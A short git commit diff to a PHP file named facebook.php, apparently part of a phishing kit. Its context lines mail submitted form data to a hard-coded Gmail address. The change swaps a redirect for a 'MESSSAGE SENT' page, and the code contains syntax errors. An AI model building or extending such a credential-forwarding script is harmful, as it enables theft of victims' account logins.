98fb4ebc440cdd642626ff60425f01d98115583f
quadriabdulsalam <99086729+quadriabdulsalam@users.noreply.github.com>
2022-07-02 17:06:06 -0500

    Update facebook.php

--- facebook.php
+++ facebook.php
@@ -12,7 +12,17 @@ $recipient = "dqutesalam@gmail.com";
 mail($recipient, $subject, $message ,$mailheader);
 or die("Error!");
 
-header('Location:indet.html');
+echo'
+
+<html>
+<head>
+<title>done</title>
+</head>
+<body>
+<h1> MESSSAGE SENT </h1>
+</body>
+</html>
+'
 
 
 ?>
